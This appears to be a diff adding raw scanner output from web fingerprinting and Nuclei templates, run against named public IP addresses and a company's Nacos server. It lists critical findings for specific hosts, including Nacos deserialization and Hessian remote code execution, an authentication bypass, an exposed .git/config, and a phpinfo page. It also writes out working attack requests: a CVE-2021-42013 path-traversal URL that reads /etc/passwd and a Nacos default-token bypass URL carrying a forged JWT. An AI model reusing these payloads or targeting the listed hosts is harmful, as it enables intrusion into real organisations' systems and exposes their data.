@@ -1,0 +1,59 @@
+[Web] [200] https://202.41.3.79 [IBM Security Access Manager]
+[Finger] https://202.41.3.79/ [200] [ibm-webseal,IBM-Tivoli-Access-Manager,IBMWAF,IBM-WebSEAL] [IBM Security Access Manager]
+[Web] [200] https://us-nacos.lingmouai.com [Nacos]
+[Web] [200] https://lingmouai.com [零眸智能]
+[Active-Finger] https://us-nacos.lingmouai.com/api/error/ [vmware-SpringBoot-Framework]
+[Active-Finger] https://us-nacos.lingmouai.com/error [vmware-SpringBoot-Framework]
+[Finger] https://us-nacos.lingmouai.com/api/error/ [404] [nginx,vmware-SpringBoot-Framework,springboot,Nginx]
+[Finger] https://us-nacos.lingmouai.com/error [500] [nginx,vmware-SpringBoot-Framework,springboot,Nginx]
+[Finger] https://us-nacos.lingmouai.com/ [200] [jQuery,nginx,Bootstrap,Alibaba-Nacos,Nginx] [Nacos]
+[Finger] https://lingmouai.com/ [200] [jQuery,PHP,nginx,Nginx] [零眸智能]
+[Nuclei] [nacos-jraftserver-deserialization-rce] [critical] https://us-nacos.lingmouai.com/v1/console/server/state
+[Web] [200] https://us-nacos.lingmouai.com [Nacos]
+[Web] [200] https://lingmouai.com [零眸智能]
+[Active-Finger] https://us-nacos.lingmouai.com/error [vmware-SpringBoot-Framework]
+[Active-Finger] https://us-nacos.lingmouai.com/api/error/ [vmware-SpringBoot-Framework]
+[Finger] https://us-nacos.lingmouai.com/api/error/ [404] [Nginx,nginx,vmware-SpringBoot-Framework,springboot]
+[Finger] https://us-nacos.lingmouai.com/ [200] [Bootstrap,Nginx,Alibaba-Nacos,nginx,jQuery] [Nacos]
+[Finger] https://us-nacos.lingmouai.com/error [500] [Nginx,nginx,vmware-SpringBoot-Framework,springboot]
+[Finger] https://lingmouai.com/ [200] [PHP,Nginx,nginx,jQuery] [零眸智能]
+[Nuclei] [alibaba-nacos-security-bypass] [high] https://us-nacos.lingmouai.com/v1/auth/users?search=accurate&pageNo=1&pageSize=99
+[Nuclei] [alibaba-Nacos-hessian-rce] [critical] https://us-nacos.lingmouai.com/v1/console/server/state
+[Nuclei] [nacos-jraftserver-deserialization-rce] [critical] https://us-nacos.lingmouai.com/v1/console/server/state
+[Web] [200] https://us-nacos.lingmouai.com [Nacos]
+[Web] [200] https://lingmouai.com [零眸智能]
+[Active-Finger] https://us-nacos.lingmouai.com/api/error/ [vmware-SpringBoot-Framework]
+[Active-Finger] https://us-nacos.lingmouai.com/error [vmware-SpringBoot-Framework]
+[Finger] https://lingmouai.com/ [200] [nginx,jQuery,PHP,Nginx] [零眸智能]
+[Finger] https://us-nacos.lingmouai.com/ [200] [Alibaba-Nacos,nginx,jQuery,Bootstrap,Nginx] [Nacos]
+[Finger] https://us-nacos.lingmouai.com/api/error/ [404] [vmware-SpringBoot-Framework,nginx,springboot,Nginx]
+[Finger] https://us-nacos.lingmouai.com/error [500] [vmware-SpringBoot-Framework,nginx,springboot,Nginx]
+[Nuclei] [alibaba-nacos-security-权限绕过] [high] https://us-nacos.lingmouai.com/v1/auth/users?search=accurate&pageNo=1&pageSize=99
+[Nuclei] [alibaba-Nacos-hessian-rce] [critical] https://us-nacos.lingmouai.com/v1/console/server/state
+[Nuclei] [nacos-jraftserver-deserialization-rce] [critical] https://us-nacos.lingmouai.com/v1/console/server/state
+[Web] [301] http://18.157.92.24 [301 Moved Permanently]
+[Web] [200] http://44.221.89.117 [Welcome to JBoss EAP 7]
+[Web] [200] http://3.23.65.6 [Welcome to JBoss EAP 8]
+[Web] [301] http://54.188.243.157 [301 Moved Permanently]
+[Web] [301] http://52.20.60.42 [301 Moved Permanently]
+[Web] [200] https://3.10.22.101:10911 [Home Gateway]
+[Active-Finger] https://3.10.22.101:10911/geoserver/web/ [GeoServer]
+[Finger] http://44.221.89.117/ [200] [Jboss,JBoss-EAP,jboss] [Welcome to JBoss EAP 7]
+[Finger] http://3.23.65.6/ [200] [Jboss,Apache-Web-Server,JBoss-EAP,jboss] [Welcome to JBoss EAP 8]
+[Finger] http://54.188.243.157/ [301] [AWS-WAF] [301 Moved Permanently]
+[Finger] http://52.20.60.42/ [301] [AWS-WAF] [301 Moved Permanently]
+[Finger] https://3.10.22.101:10911/ [200] [Jboss,PHP,SVN,JSP,Servlet,Oracle-JAVA,jboss] [Home Gateway]
+[Finger] https://3.10.22.101:10911/geoserver/web/ [200] [geoserver,Apache-Web-Server,GeoServer] [GeoServer: Welcome]
+[Finger] http://18.157.92.24/ [301] [AWS-WAF] [301 Moved Permanently]
+[Nuclei] [git-config] [medium] https://3.10.22.101:10911/.git/config
+[Nuclei] [CVE-2021-42013] [critical] https://3.10.22.101:10911/icons/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd
+[Nuclei] [phpinfo-files] [low] https://3.10.22.101:10911/php.php
+[Web] [404] http://58.245.24.94:8848 [HTTP Status 404 – Not Found]
+[Active-Finger] http://58.245.24.94:8848/nacos/ [Alibaba-Nacos]
+[Finger] http://58.245.24.94:8848/nacos/ [200] [jQuery,Bootstrap,Alibaba-Nacos] [Nacos]
+[Nuclei] [alibaba-nacos-security-权限绕过] [high] http://58.245.24.94:8848/nacos/v1/auth/users?search=accurate&pageNo=1&pageSize=99
+[Nuclei] [alibaba-Nacos-hessian-rce] [critical] http://58.245.24.94:8848/nacos/v1/console/server/state
+[Nuclei] [nacos-jraftserver-deserialization-rce] [critical] http://58.245.24.94:8848/nacos/v1/console/server/state
+[Nuclei] [nacos-jraftserver-deserialization-rce] [critical] http://58.245.24.94:8848/nacos/v1/console/server/state
+[Nuclei] [alibaba-Nacos-hessian-rce] [critical] http://58.245.24.94:8848/nacos/v1/console/server/state
+[Nuclei] [alibaba-Nacos-default-token 权限绕过] [high] http://58.245.24.94:8848/nacos/v1/auth/users/?username=2x7Ne77rISYcYzc9YbSOm2xFlkq&accessToken=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6OTk5OTk5OTk5OX0.00LxfkpzYpdVeojTfqMhtpPvNidpNcDoLU90MnHzA8Q
